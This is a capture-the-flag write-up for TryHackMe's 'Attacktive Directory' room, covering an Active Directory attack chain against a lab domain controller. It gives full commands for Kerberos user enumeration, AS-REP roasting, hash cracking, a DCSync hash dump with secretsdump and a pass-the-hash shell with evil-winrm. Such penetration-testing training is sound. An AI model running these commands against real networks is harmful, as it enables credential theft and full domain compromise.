# Attacktive Directory

**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Active Directory / Windows  
**Status:** ✅ Completed  
**Techniques:** Kerberos Enumeration · AS-REP Roasting · Kerberoasting · SecretsDump · Pass-the-Hash  

> *"99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?"*

---

## Overview

Attacktive Directory is a guided Active Directory exploitation room that walks through a realistic internal network attack chain — from initial enumeration of a Domain Controller, through Kerberos abuse, credential cracking, and ultimately full Domain Admin compromise via Impacket's secretsdump.

This room closely mirrors what you'd do in a real internal VAPT engagement where you land on the network with no credentials and need to escalate to DA.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service enumeration |
| `enum4linux` / `smbclient` | SMB enumeration |
| `kerbrute` | Kerberos user enumeration |
| `GetNPUsers.py` (Impacket) | AS-REP Roasting — harvesting hashes for accounts without pre-auth |
| `hashcat` | Offline hash cracking |
| `GetUserSPNs.py` (Impacket) | Kerberoasting — harvesting TGS tickets |
| `smbclient` | Authenticated SMB access |
| `secretsdump.py` (Impacket) | Dumping NTDS.dit hashes from DC |
| `evil-winrm` | Remote shell via WinRM |

---

## Phase 1 — Reconnaissance

### Port Scan

```bash
nmap -sV -sC -T4 -p- <TARGET_IP>
```

Key open ports identified:

| Port | Service | Notes |
|---|---|---|
| 53 | DNS | Domain: `spookysec.local` |
| 88 | Kerberos | Confirms Active Directory environment |
| 135 | MSRPC | Standard Windows RPC |
| 139 / 445 | SMB | File sharing, potential enumeration target |
| 3268 / 3269 | LDAP / LDAPS | Global Catalog — confirms DC |
| 3389 | RDP | Remote Desktop enabled |

**Key finding:** Port 88 (Kerberos) open immediately confirms this is a Domain Controller. The domain name `spookysec.local` is identifiable via DNS enumeration.

---

## Phase 2 — Enumeration

### SMB Enumeration

```bash
enum4linux -a <TARGET_IP>
smbclient -L \\\\<TARGET_IP>\\ -N
```

SMB enumeration reveals available shares and potentially leaks domain information. Anonymous access attempts are made to identify any readable shares.

### Kerberos User Enumeration with Kerbrute

Since Kerberos is exposed, user enumeration is possible without authentication by sending AS-REQ packets and observing error responses.

```bash
kerbrute userenum --dc <TARGET_IP> -d spookysec.local userlist.txt
```

Kerbrute distinguishes between:
- `PRINCIPAL UNKNOWN` — username does not exist
- `VALID USERNAME` — username exists in the domain

A custom wordlist (provided in the room) is used. This yields a list of valid domain usernames — critical for the next phase.

**Why this matters in real engagements:** Kerberos user enumeration requires no credentials and generates minimal noise compared to LDAP or SMB enumeration. It's a first-choice technique in internal network assessments.

---

## Phase 3 — AS-REP Roasting

### What is AS-REP Roasting?

When a domain account has **"Do not require Kerberos preauthentication"** enabled, an attacker can request an AS-REP (Authentication Service Response) for that user without knowing their password. The KDC responds with a ticket encrypted with the user's password hash — which can then be cracked offline.

### Harvesting AS-REP Hashes

```bash
python3 GetNPUsers.py spookysec.local/ \
  -usersfile valid_users.txt \
  -no-pass \
  -dc-ip <TARGET_IP>
```

A hash is returned for the vulnerable account in the format:

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...
```

### Cracking the Hash

```bash
hashcat -m 18200 hash.txt passwordlist.txt --force
```

Hash mode `18200` = Kerberos AS-REP etype 23. The password is recovered from the hash using the provided wordlist.

**Credentials obtained:** `svc-admin:<cracked_password>`

---

## Phase 4 — SMB Access with Recovered Credentials

With valid credentials for `svc-admin`, authenticated SMB access is possible:

```bash
smbclient -L \\\\<TARGET_IP>\\ -U svc-admin
```

Enumeration of shares reveals a non-standard share. Connecting and browsing:

```bash
smbclient \\\\<TARGET_IP>\\backup -U svc-admin
smb: \> ls
smb: \> get backup_credentials.txt
```

A file is found containing **base64-encoded credentials** for the `backup` account. Decoding reveals plaintext credentials:

```bash
echo "<base64string>" | base64 -d
```

**Credentials obtained:** `backup:<plaintext_password>`

---

## Phase 5 — Privilege Escalation via secretsdump

### Why the Backup Account is Critical

The `backup` account has special privileges — specifically, it has **Replication rights** on the domain (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). This is the same privilege abused in a **DCSync attack**.

### Dumping All Domain Hashes

```bash
python3 secretsdump.py -just-dc \
  backup@<TARGET_IP>
```

`secretsdump.py` uses the replication privilege to pull all password hashes from the domain's NTDS.dit database — effectively acting like a Domain Controller sync.

Output includes hashes for **all domain accounts** including:
- `Administrator`
- `krbtgt`
- All user accounts

Format: `username:RID:LM_hash:NT_hash:::`

---

## Phase 6 — Domain Admin Access via Pass-the-Hash

With the Administrator's NT hash, a full shell is obtained without needing to crack the password:

```bash
evil-winrm -i <TARGET_IP> \
  -u Administrator \
  -H <NT_HASH>
```

**Result:** Full Domain Admin shell on the Domain Controller.

---

## Attack Chain Summary

```
Nmap Scan
    │
    ▼
Kerberos on port 88 → Domain: spookysec.local
    │
    ▼
Kerbrute user enumeration → valid_users.txt
    │
    ▼
AS-REP Roasting (GetNPUsers.py) → svc-admin hash
    │
    ▼
Hashcat crack → svc-admin:password
    │
    ▼
SMB access → backup_credentials.txt → backup:password
    │
    ▼
secretsdump.py (DCSync) → All NTDS hashes
    │
    ▼
Pass-the-Hash (evil-winrm) → Administrator shell ✅
```

---

## Key Takeaways

**1. Kerberos pre-authentication disabled = immediate hash harvesting**
Always check for AS-REP roastable accounts. `GetNPUsers.py` with a user list is fast and silent.

**2. Replication privileges = DCSync = game over**
Any account with replication rights on the domain is effectively equivalent to Domain Admin. Service accounts and backup accounts are common misconfigured holders of this privilege.

**3. Pass-the-Hash eliminates the need to crack strong passwords**
NT hashes from secretsdump can be used directly in evil-winrm, impacket tools, and CrackMapExec — cracking is optional.

**4. The full chain requires zero exploits**
This entire compromise uses misconfigurations and Kerberos protocol features — no CVEs, no buffer overflows. This is exactly what a real internal VAPT looks like.

---

## Real-World VAPT Relevance

| Step | Real Engagement Equivalent |
|---|---|
| Kerberos user enum | First action after landing on internal network |
| AS-REP Roasting | Checked on every engagement — low noise, high reward |
| Credential files on SMB | Extremely common finding in real audits |
| DCSync via backup account | Classic privilege escalation path in enterprises |
| Pass-the-Hash | Standard post-exploitation lateral movement technique |

---

## References

- [Impacket Suite](https://github.com/fortra/impacket)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [TryHackMe — Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
- [HarmJ0y — AS-REP Roasting](https://blog.harmj0y.net/activedirectory/roasting-as-reps/)
